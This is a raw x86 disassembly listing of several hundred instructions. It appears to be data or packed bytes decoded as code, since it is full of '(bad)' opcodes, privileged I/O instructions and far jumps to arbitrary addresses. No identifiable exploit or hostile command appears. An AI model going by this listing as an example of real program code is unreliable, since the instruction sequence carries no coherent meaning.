  4284ae:	adc    DWORD PTR [eax+0xb],0xffffffd8
  4284b2:	sub    esi,DWORD PTR [ecx-0x13]
  4284b5:	inc    ebx
  4284b6:	push   ds
  4284b7:	dec    ebx
  4284b8:	pop    ecx
  4284b9:	sub    al,0x5c
  4284bb:	inc    DWORD PTR [ecx+0xffa0aa5]
  4284c1:	fiadd  WORD PTR [esi+0x65]
  4284c4:	fnstcw WORD PTR [ecx+0x4e770551]
  4284ca:	je     0x4284bd
  4284cc:	les    ecx,FWORD PTR [edx]
  4284ce:	push   ebx
  4284cf:	loopne 0x42850d
  4284d1:	cld    
  4284d2:	add    DWORD PTR [edi-0x24],esi
  4284d5:	or     BYTE PTR [eax+ebp*8+0x5627dad5],0x1f
  4284dd:	jae    0x4284b4
  4284df:	retf   
  4284e0:	ss pop ebx
  4284e2:	bound  esp,QWORD PTR [esi-0x1ed4956]
  4284e8:	or     ebp,DWORD PTR [eax+0x6bb61399]
  4284ee:	add    esp,DWORD PTR ds:0xc002bd45
  4284f4:	adc    DWORD PTR [ebx+0x8d42c26],ecx
  4284fa:	add    DWORD PTR [edx-0x6b],edi
  4284fd:	dec    ebp
  4284fe:	jae    0x428562
  428500:	(bad)  
  428504:	ss jbe 0x428561
  428507:	jbe    0x4284ad
  428509:	ror    DWORD PTR [ecx+edx*2],cl
  42850c:	dec    edx
  42850d:	das    
  42850e:	cmp    al,0xff
  428510:	popf   
  428511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428512:	mov    ?,WORD PTR [edi+0x62]
  428515:	dec    esp
  428516:	xchg   esp,eax
  428517:	mov    al,0x23
  428519:	fistp  WORD PTR [ebx]
  42851b:	add    al,0xec
  42851d:	adc    DWORD PTR [esi+0xbfc80c6],esi
  428523:	test   esi,edi
  428525:	pop    eax
  428526:	jmp    DWORD PTR [edx+0x69]
  428529:	imul   edi,DWORD PTR ds:0x703a36f4,0xffffff94
  428530:	cmp    BYTE PTR [ebx-0x58],cl
  428533:	push   es
  428534:	pop    ebx
  428535:	push   es
  428536:	cmp    cl,BYTE PTR [eax+ebx*2]
  428539:	icebp  
  42853a:	dec    esi
  42853b:	push   esp
  42853c:	mov    ss,WORD PTR [ebx]
  42853e:	gs fs mov ebp,0x3afc090c
  428545:	lods   eax,DWORD PTR ds:[esi]
  428546:	out    0xfe,al
  428548:	fld    QWORD PTR [esi]
  42854a:	stos   BYTE PTR es:[edi],al
  42854b:	adc    eax,DWORD PTR [eax-0x30]
  42854e:	icebp  
  42854f:	adc    DWORD PTR [edi-0x4c93800e],0xffffffeb
  428556:	mov    BYTE PTR [ebp-0x1c532d71],cl
  42855c:	iret   
  42855d:	hlt    
  42855e:	sub    ecx,edi
  428560:	push   0xbe530ed6
  428565:	adc    BYTE PTR [edx],0x7c
  428568:	shl    DWORD PTR [ebx+0x540577bb],0x12
  42856f:	call   0x8c3:0x8a8ad765
  428576:	hlt    
  428577:	outs   dx,BYTE PTR ds:[esi]
  428578:	sub    ebp,DWORD PTR [edx]
  42857a:	jnp    0x4285a5
  42857c:	lds    eax,FWORD PTR [ebp+0x10a94624]
  428582:	and    DWORD PTR [ecx+0x6743a66],ebx
  428588:	loopne 0x42859a
  42858a:	mov    ebx,0x8f59bf17
  42858f:	and    DWORD PTR [ecx+0x0],ebx
	...
  4285f2:	add    BYTE PTR [eax],al
  4285f4:	push   ecx
  4285f5:	div    BYTE PTR ds:0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0x618ca3f6
  428602:	xchg   BYTE PTR [ebx+0x1b01e],ch
  428608:	add    eax,0x87000001
  42860d:	les    esi,FWORD PTR [eax]
  42860f:	adc    DWORD PTR [ebx+0x4a],edi
  428612:	and    al,0x9
  428614:	stos   BYTE PTR es:[edi],al
  428615:	(bad)  
  428616:	das    
  428617:	pop    ss
  428618:	in     al,dx
  428619:	outs   dx,BYTE PTR ds:[esi]
  42861a:	push   ecx
  42861b:	bound  edi,QWORD PTR [esi-0x4464adf5]
  428621:	jne    0x42868e
  428623:	repz cs dec esi
  428626:	push   DWORD PTR [eax+ebp*8]
  428629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42862a:	dec    esp
  42862b:	jmp    0xb0067550
  428630:	sbb    al,0x5b
  428632:	mov    eax,0x77244651
  428637:	jo     0x428625
  428639:	stos   BYTE PTR es:[edi],al
  42863a:	add    bh,BYTE PTR [eax-0x62bf3ee9]
  428640:	mov    al,0xdf
  428642:	pop    es
  428643:	out    dx,al
  428644:	sub    ecx,DWORD PTR [eax]
  428646:	sub    dh,dh
  428648:	mov    ah,0x72
  42864a:	pop    eax
  42864b:	mov    esp,0x707235c5
  428650:	xor    eax,eax
  428652:	sbb    BYTE PTR [edx-0x5e11a347],bh
  428658:	xchg   esp,eax
  428659:	(bad)  
  42865a:	mov    edi,0xd19d5213
  42865f:	sbb    al,0xf6
  428661:	(bad)  
  428662:	stos   DWORD PTR es:[edi],eax
  428663:	pushf  
  428664:	mov    bh,0x5e
  428666:	sbb    DWORD PTR [ecx+ecx*4-0x6c],ecx
  42866a:	mov    bh,0xeb
  42866c:	call   0x63de42dc
  428671:	or     BYTE PTR [ebp-0x49f4ea70],dl
  428677:	cmp    BYTE PTR ds:0x4a67305e,bl
  42867d:	dec    esi
  42867e:	ins    DWORD PTR es:[edi],dx
  42867f:	mov    esi,0x20714741
  428684:	push   0xffffffb3
  428686:	aam    0xaf
  428688:	(bad)  
  428689:	sbb    al,al
  42868b:	jno    0x428689
  42868d:	pop    ecx
  42868e:	data16 into 
  428690:	cld    
  428691:	daa    
  428692:	retf   0xf21c
  428695:	jno    0x428659
  428697:	cwde   
  428698:	and    al,bh
  42869a:	add    ebx,DWORD PTR [edi+edx*8-0x51372708]
  4286a1:	jae    0x428641
  4286a3:	fidiv  DWORD PTR [eax+edx*4-0x42]
  4286a7:	and    ebx,DWORD PTR [edx+ebp*2+0x25fc7328]
  4286ae:	add    eax,0x41ff4402
  4286b3:	jne    0x42872c
  4286b5:	mov    bh,0x6b
  4286b7:	add    DWORD PTR [edx],edi
  4286b9:	sub    al,0x92
  4286bb:	sub    dl,BYTE PTR [edi]
  4286bd:	mov    ebx,0x81ca7dfa
  4286c2:	mov    ch,0x24
  4286c4:	enter  0x44f3,0xac
  4286c8:	rcl    edx,cl
  4286ca:	lea    edi,ds:0x8f1289b6
  4286d0:	xlat   BYTE PTR ds:[ebx]
  4286d1:	mov    ebp,0xa7ab58b1
  4286d6:	push   esi
  4286d7:	jmp    0x578cdc71
  4286dc:	(bad)  
  4286dd:	jge    0x42872d
  4286df:	ins    BYTE PTR es:[edi],dx
  4286e0:	outs   dx,BYTE PTR ds:[esi]
  4286e1:	xchg   ebx,eax
  4286e2:	retf   0x381b
  4286e5:	scas   al,BYTE PTR es:[edi]
  4286e6:	sar    BYTE PTR [ecx],1
  4286e8:	scas   eax,DWORD PTR es:[edi]
  4286e9:	aaa    
  4286ea:	jmp    0xc123be71
  4286ef:	call   0xc05b:0x783fc98a
  4286f6:	sbb    esi,DWORD PTR [eax+0x32c4b4f8]
  4286fc:	sub    DWORD PTR [ecx],esi
  4286fe:	leave  
  4286ff:	mov    al,0x67
  428701:	iret   
  428702:	sub    BYTE PTR [edi+0x24],bl
  428705:	push   edx
  428706:	packsswb mm7,QWORD PTR [edx]
  428709:	cmp    dh,BYTE PTR [edi+0x52616a94]
  42870f:	fdiv   DWORD PTR [ebx+0x0]
	...
  428772:	add    BYTE PTR [eax],al
  428774:	push   esi
  428775:	pop    ebx
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x73470f96
  428783:	or     al,0x23
  428785:	mov    cl,0x1
  428787:	add    BYTE PTR ds:0x4000001,al
  42878d:	out    0xb,eax
  42878f:	push   edi
  428790:	fwait
  428791:	xchg   ecx,eax
  428792:	xchg   esi,eax
  428793:	sti    
  428794:	iret   
  428795:	push   ebp
  428796:	stos   DWORD PTR es:[edi],eax
  428797:	fwait
  428798:	retf   
  428799:	aaa    
  42879a:	imul   esi,DWORD PTR [edx],0x6737dc75
  4287a0:	popa   
  4287a1:	ins    BYTE PTR es:[edi],dx
  4287a2:	repz dec ebp
  4287a4:	bnd jns 0x428786
  4287a7:	adc    edx,DWORD PTR [esi+0x74]
  4287aa:	mov    DWORD PTR [ebp+0x1696ea72],ecx
  4287b0:	leave  
  4287b1:	(bad)  
  4287b2:	mov    ebx,ds
  4287b4:	int3   
  4287b5:	mov    ?,WORD PTR [ecx-0x52416381]
  4287bb:	outs   dx,DWORD PTR ds:[esi]
  4287bc:	push   ds
  4287bd:	jns    0x4287bc
  4287bf:	bound  ebx,QWORD PTR ds:0xca41f6dd
  4287c5:	js     0x42879d
  4287c7:	cmp    BYTE PTR [edx+0x5f],0x64
  4287cb:	pop    ebp
  4287cc:	int    0x81
  4287ce:	jl     0x428796
  4287d0:	lock adc ah,dh
  4287d3:	push   ds
  4287d4:	jmp    0x6867:0xf51bb85c
  4287db:	int    0x15
  4287dd:	cmp    ah,BYTE PTR [ebp-0x68f2d760]
  4287e3:	mov    ah,0x8
  4287e5:	xor    DWORD PTR [edi+0x31],esp
  4287e8:	sbb    al,0xbc
  4287ea:	call   0x1fb7305d
  4287ef:	mov    dh,0xfb
  4287f1:	push   ebx
  4287f2:	ins    DWORD PTR es:[edi],dx
  4287f3:	or     al,0x36
  4287f5:	call   0x9409:0x54d76237
  4287fc:	leave  
  4287fd:	push   esi
  4287fe:	mov    ebp,0x665cd969
  428803:	lods   eax,DWORD PTR ds:[esi]
  428804:	data16 mov ch,0xb2
  428807:	lods   al,BYTE PTR ds:[esi]
  428808:	mov    esp,DWORD PTR [ecx]
  42880a:	mov    eax,ds:0xe8b6ab3c
  42880f:	or     DWORD PTR [esi+ecx*1],esi
  428812:	sbb    eax,0x49ac695a
  428817:	mov    ds:0x9b7a414b,al
  42881c:	and    DWORD PTR [edx-0x25],ebp
  42881f:	inc    ebx
  428820:	push   ebx
  428821:	push   0x68870a5b
  428826:	mov    edi,0x13354bd2
  42882b:	and    dl,BYTE PTR [ebp-0x7bc13bc5]
  428831:	pop    ecx
  428832:	call   0xf7331b20
  428837:	mov    edx,0x7c325674
  42883c:	popa   
  42883d:	(bad)  
  42883f:	ins    BYTE PTR es:[edi],dx
  428840:	aam    0xf
  428842:	sub    ah,0x3e
  428845:	test   DWORD PTR [edx-0x5c],ebp
  428848:	pop    ss
  428849:	push   edx
  42884a:	(bad)  
  42884b:	dec    eax
  42884c:	mov    WORD PTR [ecx-0x74],fs
  42884f:	lahf   
  428850:	cmp    WORD PTR [edx-0x12],ax
  428854:	cld    
  428855:	(bad)  
  428857:	sub    ebx,DWORD PTR [edi+0x17]
  42885a:	add    DWORD PTR [esi-0xf],ebp
  42885d:	call   0xa2d8:0x3a3be08e
  428864:	jb     0x428847
  428866:	in     eax,dx
  428867:	jg     0x4288a5
  428869:	mov    BYTE PTR [ebx-0x7e],dl
  42886c:	mov    cl,0x62
  42886e:	shl    BYTE PTR [eax+ebx*2-0x6e4b1a7c],1
  428875:	mov    DWORD PTR [ebp+ecx*8+0x3e41115a],ecx
  42887c:	stos   DWORD PTR es:[edi],eax
  42887d:	and    eax,0x1e6bfe80
  428882:	push   ecx
  428883:	(bad)  
  428884:	cwde   
  428885:	push   edx
  428886:	inc    edi
  428887:	aas    
  428888:	data16 daa 
  42888a:	shl    DWORD PTR [edi+0x54],1
  42888d:	std    
  42888e:	int3   
  42888f:	in     al,0x37
	...
  4288f1:	add    BYTE PTR [eax],al
  4288f3:	add    BYTE PTR [esi],ah
  4288f5:	jp     0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0x79f662f1],bx
  428902:	aaa    
  428903:	inc    edi
  428904:	sub    BYTE PTR [edx+0x1050001],dh
  42890a:	add    BYTE PTR [eax],al
  42890c:	adc    dh,BYTE PTR [ecx]
  42890e:	lock sub bl,BYTE PTR gs:[ebp+0x8]
  428913:	xchg   BYTE PTR [eax],al
  428915:	fcomip st,st(7)
  428917:	xchg   edi,eax
  428918:	adc    DWORD PTR [ebp+eiz*8-0x35e05de9],edi
  42891f:	call   FWORD PTR [ecx-0x1a]
  428922:	sub    DWORD PTR [edi],0x74
  428925:	inc    esi
  428926:	add    esp,ebp
  428928:	in     al,0xcd
  42892a:	mov    eax,0x8f33fc81
  42892f:	xor    DWORD PTR [edi+esi*4],edi
  428932:	outs   dx,DWORD PTR ds:[esi]
  428933:	ins    BYTE PTR es:[edi],dx
  428934:	enter  0x5cfc,0x45
  428938:	aam    0x6b
  42893a:	scas   eax,DWORD PTR es:[edi]
  42893b:	in     al,0x7a
  42893d:	sbb    al,BYTE PTR [edx+0x39]
  428940:	push   0x5243dc31
  428945:	mov    dh,0x33
  428947:	cmp    DWORD PTR [ebx+0x7f56cbac],0x7c
  42894e:	pop    ebp
  42894f:	dec    esp
  428950:	or     edi,DWORD PTR [ecx-0x16]
  428953:	cld    
  428954:	sar    BYTE PTR [ecx-0xa],1
  428957:	ins    DWORD PTR es:[edi],dx
  428958:	sbb    edx,ebp
  42895a:	mov    ds:0xf8ead20e,al
  42895f:	pop    esp
  428960:	imul   edi,DWORD PTR [esi-0x76],0xfffffffc
  428964:	pop    esp
  428965:	or     eax,0x29c15443
  42896a:	mov    ebp,0xa0941160
  42896f:	out    dx,al
  428970:	fdiv   DWORD PTR [ebp-0x4d]
  428973:	or     al,dh
  428975:	mov    esp,DWORD PTR [ecx+0x10acb3c5]
  42897b:	push   0xc2acc8ae
  428980:	jmp    0xfab8f4f5
  428985:	sub    ch,BYTE PTR [ebx-0x38]
  428988:	(bad)  
  428989:	mov    bh,0xf9
  42898b:	fld    DWORD PTR [ebx]
  42898d:	call   0x6516:0xe8c9ba6a
  428994:	adc    al,0xd3
  428996:	cmp    edi,esi
  428998:	hlt    
  428999:	push   ds
  42899a:	jl     0x428980
  42899c:	jp     0x428934
  42899e:	xlat   BYTE PTR ds:[ebx]
  42899f:	push   ds
  4289a0:	dec    edi
  4289a1:	imul   ebx,esp,0xffffffcf
  4289a4:	aad    0x73
  4289a6:	pop    esp
  4289a7:	clc    
  4289a8:	sbb    DWORD PTR [ecx+0x16e62359],0xa2e27921
  4289b2:	xor    al,0x70
  4289b4:	mov    ecx,DWORD PTR [eax+0x3c1dd26]
  4289ba:	jnp    0x428950
  4289bc:	aam    0x38
  4289be:	xor    DWORD PTR [esi+0x76d29b19],ebp
  4289c4:	ins    BYTE PTR es:[edi],dx
  4289c5:	and    al,0x2c
  4289c7:	cmc    
  4289c8:	(bad)  
  4289c9:	xor    eax,0x9c5d8506
  4289ce:	stos   BYTE PTR es:[edi],al
  4289cf:	stos   DWORD PTR es:[edi],eax
  4289d0:	push   esi
  4289d1:	mov    eax,0x1beb2adc
  4289d6:	sbb    ecx,esp
  4289d8:	scas   eax,DWORD PTR es:[edi]
  4289d9:	pop    ss
  4289da:	mov    bl,0x6a
  4289dc:	add    DWORD PTR [edi+0x2e46c59],eax
  4289e2:	mov    dh,BYTE PTR [esi+ebp*1]
  4289e5:	adc    ebp,eax
  4289e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4289e8:	aam    0xc2
  4289ea:	cwde   
  4289eb:	out    dx,eax
  4289ec:	(bad)  
  4289ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289ee:	jle    0x4289ae
  4289f0:	dec    esp
  4289f1:	and    al,0xe8
  4289f3:	jg     0x4289ee
  4289f5:	and    edi,DWORD PTR [ebp+0x565d7a03]
  4289fb:	xor    ecx,DWORD PTR [ebp+0x62]
  4289fe:	xor    esp,DWORD PTR [ecx+0x8]
  428a01:	(bad)  
  428a03:	add    bl,dh
  428a05:	and    ebp,esi
  428a07:	and    al,0xb5
  428a09:	or     BYTE PTR [esi-0x17],ch
  428a0c:	adc    dl,ah
  428a0e:	(bad)  [ecx+0xba]
	...
  428a74:	dec    ebp
  428a75:	or     al,0xf8
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax-0x3080a3ed]
  428a83:	jmp    0x105:0x1b32d
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	scas   eax,DWORD PTR es:[edi]
  428a8d:	(bad)  
  428a8e:	lds    eax,FWORD PTR [eax-0x37]
  428a91:	data16 sahf 
  428a93:	imul   edi,esi,0x26a9bdc8
  428a99:	fadd   QWORD PTR [ecx+0xd15cc9c]
  428a9f:	js     0x428aa0
  428aa1:	sbb    DWORD PTR fs:[eax+0x3c2b32],0xffffffd5
  428aa9:	fdiv   DWORD PTR [edi+0x1f]
  428aac:	test   al,0xc6
  428aae:	loopne 0x428a38
  428ab0:	cdq    
  428ab1:	imul   edx,DWORD PTR [ecx+0x2f],0x47f90156
  428ab8:	xor    BYTE PTR [ecx+esi*1+0x6f],ch
  428abc:	pop    esp
  428abd:	sbb    edx,DWORD PTR [edx-0x42]
  428ac0:	sbb    DWORD PTR [ebx+0x7a],edx
  428ac3:	sar    BYTE PTR [eax-0x2d],0x15
  428ac7:	bound  esp,QWORD PTR [ecx]
  428ac9:	clc    
  428aca:	sub    eax,0x52ed3af8
  428acf:	fld    QWORD PTR [ecx]
  428ad1:	adc    BYTE PTR [esi],bh
  428ad3:	daa    
  428ad4:	sbb    dl,BYTE PTR [edi+eax*4]
  428ad7:	sbb    esi,DWORD PTR [ebp-0x32]
  428ada:	and    BYTE PTR [eax],cl
  428adc:	test   BYTE PTR [esi+eiz*8+0x66],al
  428ae0:	mov    edx,0xc730878d
  428ae5:	gs scas al,BYTE PTR es:[edi]
  428ae7:	push   es
  428ae8:	xor    ch,BYTE PTR [edi-0x48]
  428aeb:	xchg   esp,eax
  428aec:	add    eax,0x33b8c63e
  428af1:	popa   
  428af2:	sbb    ah,BYTE PTR [ecx-0x6d]
  428af5:	mov    eax,0x74cc1528
  428afa:	or     ah,BYTE PTR [ebx]
  428afc:	jns    0x428acb
  428afe:	int3   
  428aff:	sub    eax,0x4c526233
  428b04:	mov    dh,0x28
  428b06:	pop    esi
  428b07:	(bad)  
  428b08:	cmp    ebp,eax
  428b0a:	ins    BYTE PTR es:[edi],dx
  428b0b:	inc    ebp
  428b0c:	sub    esp,eax
  428b0e:	adc    ecx,DWORD PTR [ecx+eax*1+0x58]
  428b12:	inc    edi
  428b13:	mov    ebp,edx
  428b15:	std    
  428b16:	xchg   ecx,eax
  428b17:	jmp    0x428b11
  428b19:	les    edx,FWORD PTR [edx+ecx*2]
  428b1c:	jg     0x428b21
  428b1e:	pop    esi
  428b1f:	int3   
  428b20:	pop    ds
  428b21:	and    edx,eax
  428b23:	dec    ebp
  428b24:	pop    edx
  428b25:	inc    esp
  428b26:	call   0x2211b638
  428b2b:	popf   
  428b2c:	xor    al,BYTE PTR [eax]
  428b2e:	dec    edx
  428b2f:	sbb    al,0xfb
  428b31:	push   ebx
  428b32:	cmp    eax,0x6a4644d6
  428b37:	pop    edx
  428b38:	imul   eax
  428b3a:	js     0x428b28
  428b3c:	sbb    DWORD PTR [edi+0x26178f78],ebx
  428b42:	add    al,0x27
  428b44:	loope  0x428b5a
  428b46:	ja     0x428af2
  428b48:	jge    0x428b17
  428b4a:	stc    
  428b4b:	outs   dx,DWORD PTR ds:[esi]
  428b4c:	call   0xe7802dd5
  428b51:	pop    edx
  428b52:	sbb    eax,0xd6b07eba
  428b57:	test   al,0x9a
  428b59:	jge    0x428bb8
  428b5b:	mov    al,ds:0x73119109
  428b60:	inc    eax
  428b61:	and    eax,DWORD PTR [eax]
  428b63:	pop    ecx
  428b64:	shl    edx,1
  428b66:	(bad)  
  428b67:	out    0x6c,eax
  428b69:	mov    BYTE PTR [ebx+0x6],dh
  428b6c:	cmp    al,0xfe
  428b6e:	(bad)  
  428b6f:	mov    esi,0xfc063f51
  428b74:	jns    0x428b4e
  428b76:	aam    0x9
  428b78:	retf   
  428b79:	inc    ebx
  428b7a:	push   ss
  428b7b:	and    al,0x78
  428b7d:	shr    ebx,0x0
  428b80:	inc    ebx
  428b81:	test   BYTE PTR [edi-0x107d11ba],bl
  428b87:	pop    edx
  428b88:	std    
  428b89:	jbe    0x428b97
  428b8b:	lods   al,BYTE PTR ds:[esi]
  428b8c:	and    bl,ah
  428b8e:	mov    BYTE PTR [ecx],al
  428b90:	jne    0x428b92
	...
  428bf2:	add    BYTE PTR [eax],al
  428bf4:	lds    edx,FWORD PTR [ebp-0x76]
  428bf7:	cli    
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x150bd17f
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [edx],cl
  428c0d:	invd   
  428c0f:	pop    es
  428c10:	mov    edi,0x91fd4510
  428c15:	push   ebp
  428c16:	into   
  428c17:	inc    edx
  428c18:	bound  ecx,QWORD PTR [edx]
  428c1a:	clc    
  428c1b:	xor    BYTE PTR [edi],ah
  428c1d:	push   cs
  428c1e:	test   al,0xc4
  428c20:	in     al,0x36
  428c22:	push   eax
  428c23:	xor    DWORD PTR [edx+0xc],0xffffffeb
  428c27:	xchg   esi,eax
  428c28:	mov    fs,WORD PTR [edi-0x5b4d109e]
  428c2e:	ss in  al,dx
  428c30:	rcl    BYTE PTR [ebx],cl
  428c32:	lock (bad) 
  428c34:	sbb    al,0xe0
  428c36:	mov    eax,0x62fc4fd9
  428c3b:	or     DWORD PTR [edx+0x7a],ecx
  428c3e:	popa   
  428c3f:	(bad)  
  428c40:	lds    ecx,FWORD PTR [ecx-0xb7e2a72]
  428c46:	cmp    DWORD PTR [ebx+0x1fa945a4],esp
  428c4c:	pop    es
  428c4d:	jle    0x428c3b
  428c4f:	sbb    bh,BYTE PTR [edi-0x4]
  428c52:	cmp    ecx,DWORD PTR [eax+edi*4+0x70]
  428c56:	dec    ebp
  428c57:	xor    al,al
  428c59:	out    dx,al
  428c5a:	adc    eax,0xd92c9990
  428c5f:	sub    esi,ebp
  428c61:	loop   0x428c92
  428c63:	or     ebp,DWORD PTR [edi-0x476319c6]
  428c69:	pop    ecx
  428c6a:	pop    esp
  428c6b:	fadd   DWORD PTR [edi+0x7585ee67]
  428c71:	dec    eax
  428c72:	inc    eax
  428c73:	xor    al,0x23
  428c75:	mov    cl,0xc0
  428c77:	rcl    BYTE PTR [ecx],cl
  428c79:	jo     0x428cc3
  428c7b:	jns    0x428c19
  428c7d:	mov    esp,ecx
  428c7f:	inc    ebx
  428c80:	dec    eax
  428c81:	xchg   esp,eax
  428c82:	push   0x932567d3
  428c87:	cmc    
  428c88:	jle    0x428cfe
  428c8a:	neg    BYTE PTR [edi-0x768c75eb]
  428c90:	or     al,0xea
  428c92:	shr    BYTE PTR [ebp-0x2dd2cca5],1
  428c98:	(bad)  
  428c99:	dec    ebp
  428c9a:	icebp  
  428c9b:	pop    edi
  428c9c:	jle    0x428d0f
  428c9e:	jnp    0x428c87
  428ca0:	loopne 0x428cae
  428ca2:	mov    ecx,0xca279617
  428ca7:	cdq    
  428ca8:	push   es
  428ca9:	mov    cl,0xe9
  428cab:	sar    DWORD PTR [ebx+0x5a],1
  428cae:	(bad)  
  428caf:	and    edx,DWORD PTR ds:0x2a570ec0
  428cb5:	push   edx
  428cb6:	or     BYTE PTR [esi+ebp*4],bh
  428cb9:	fsub   DWORD PTR [eax+0x18]
  428cbc:	das    
  428cbd:	sbb    eax,0xac72d5a4
  428cc2:	mov    ebp,0x688b034
  428cc7:	and    al,0x67
  428cc9:	repz (bad) 
  428ccc:	sbb    edi,DWORD PTR [ecx+0x14]
  428ccf:	cmp    DWORD PTR [edx+0x74dcde22],esi
  428cd5:	ds inc edi
  428cd7:	or     BYTE PTR [ebp+0x57ebf225],ch
  428cdd:	pop    ebx
  428cde:	out    0x24,al
  428ce0:	pop    ebp
  428ce1:	mov    esi,0x79864525
  428ce6:	xchg   edx,eax
  428ce7:	inc    edi
  428ce8:	mov    dh,0x58
  428cea:	jge    0x428c80
  428cec:	jo     0x428d10
  428cee:	stc    
  428cef:	loop   0x428d52
  428cf1:	pop    esp
  428cf2:	fiadd  DWORD PTR [edx+esi*1]
  428cf5:	jne    0x428ce5
  428cf7:	retf   
  428cf8:	mov    bl,0x7
  428cfa:	mov    esp,0x855e0212
  428cff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d00:	sub    BYTE PTR [ebx+0x5d0947d0],ch
  428d06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428d07:	sbb    BYTE PTR [eax+0x47],0xdd
  428d0b:	or     al,0x46
  428d0d:	pop    es
  428d0e:	jg     0x428d0b
  428d10:	lock add BYTE PTR [eax],al
	...
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x13f3
  428d82:	adc    BYTE PTR [edi+esi*1+0x50001b5],0x1
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	inc    edi
  428d8d:	ins    DWORD PTR es:[edi],dx
  428d8e:	jge    0x428d22
  428d90:	sub    edx,DWORD PTR [eax+0x56]
  428d93:	cs push ebx
  428d95:	sub    bl,BYTE PTR [esi]
  428d97:	mov    bl,0x35
  428d99:	dec    eax
  428d9a:	cmp    DWORD PTR [ecx+0x60],edx
  428d9d:	mov    eax,ds:0x3982c5a
  428da2:	fwait
  428da3:	sbb    DWORD PTR ds:0xc895cf96,ebp
  428da9:	les    edx,FWORD PTR gs:[ecx+0x78]
  428dad:	fdivr  QWORD PTR [esi-0x5e]
  428db0:	mov    ch,0x7b
  428db2:	rcr    DWORD PTR [ebx+esi*2+0x573b0be1],cl
  428db9:	ss inc edx
  428dbb:	(bad)  
  428dbc:	std    
  428dbd:	icebp  
  428dbe:	jmp    0xe36f:0x4af8
  428dc4:	mov    ds,WORD PTR [edx-0x68]
  428dc7:	mov    WORD PTR [ebx],?
  428dc9:	sub    edx,DWORD PTR [esi+eiz*8-0x2a]
  428dcd:	inc    eax
  428dce:	xor    ch,BYTE PTR [ebx-0x24]
  428dd1:	(bad)  
  428dd2:	ficom  DWORD PTR [edx+0xa21419e]
  428dd8:	sub    DWORD PTR [ecx-0x75],esp
  428ddb:	xchg   esi,eax
  428ddc:	push   ss
  428ddd:	test   BYTE PTR [edi+0x63],dl
  428de0:	sti    
  428de1:	mov    BYTE PTR ds:[esi],0xdf
  428de5:	adc    eax,0x2ac0853
  428dea:	xchg   ebx,eax
  428deb:	clc    
  428dec:	sbb    edx,DWORD PTR [edx+eiz*2+0x72ee2e00]
  428df3:	mov    ebp,0xbe2ea374
  428df8:	repnz sbb esp,esi
  428dfb:	(bad)  
  428dfc:	push   edi
  428dfd:	aaa    
  428dfe:	pop    edx
  428dff:	cmp    bh,BYTE PTR [eax-0x24253505]
  428e05:	add    ebx,ebx
  428e07:	pop    ds
  428e08:	xchg   edx,eax
  428e09:	loopne 0x428dd8
  428e0b:	pop    ebx
  428e0c:	jmp    0x977b2fbe
  428e11:	sub    dh,BYTE PTR [ecx]
  428e13:	mov    cs,WORD PTR [esi]
  428e15:	pusha  
  428e16:	and    DWORD PTR [ecx+0x6c],ecx
  428e19:	in     eax,dx
  428e1a:	mov    ds:0xe8110e2,al
  428e1f:	push   eax
  428e20:	(bad)  
  428e21:	pop    esi
  428e22:	mov    ds:0x614a7199,eax
  428e27:	add    DWORD PTR [edx],ecx
  428e29:	cmp    al,dh
  428e2b:	dec    ebp
  428e2c:	test   al,0x83
  428e2e:	call   0x5210:0x45ed19b7
  428e35:	rcr    ebp,1
  428e37:	and    BYTE PTR [edi+0x52],bl
  428e3a:	arpl   WORD PTR [ebx+0x7d04a19e],bp
  428e40:	add    DWORD PTR [ebx+0x533313e4],edx
  428e46:	jmp    0x86ef24b0
  428e4b:	rcr    edx,0x75
  428e4e:	xchg   edi,eax
  428e4f:	push   ds
  428e50:	sub    al,0x35
  428e52:	frstor [ebx+0x1d]
  428e55:	push   edi
  428e56:	sbb    eax,0xf84be9
  428e5b:	in     al,dx
  428e5c:	enter  0x55c5,0x6d
  428e60:	sar    dh,0xcd
  428e63:	sahf   
  428e64:	in     al,0x86
  428e66:	push   esi
  428e67:	xchg   BYTE PTR [edx-0x1669c246],ah
  428e6d:	sub    ebp,DWORD PTR [edx-0x64bc5f60]
  428e73:	inc    esp
  428e74:	add    BYTE PTR [esi+esi*1-0x59],ch
  428e78:	scas   eax,DWORD PTR es:[edi]
  428e79:	sub    esi,DWORD PTR [esi]
  428e7b:	repz xor DWORD PTR [eax+0x57],ebp
  428e7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e80:	push   eax
  428e81:	outs   dx,BYTE PTR ds:[esi]
  428e82:	add    DWORD PTR [ecx+0x5cd9f3b3],edx
  428e88:	mov    DWORD PTR [eax+eax*8-0x483dcc16],edi
  428e8f:	xchg   esp,eax
  428e90:	jp     0x428e92
	...
  428ef2:	add    BYTE PTR [eax],al
  428ef4:	dec    edi
  428ef5:	pop    ebp
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0xf6
  428f01:	popa   
  428f02:	mov    cl,0x3b
  428f04:	cmp    al,0xb6
  428f06:	add    DWORD PTR [eax],eax
  428f08:	add    eax,0x56000001
  428f0d:	mov    eax,0xd6be9ae0
  428f12:	out    0x7f,al
  428f14:	iret   
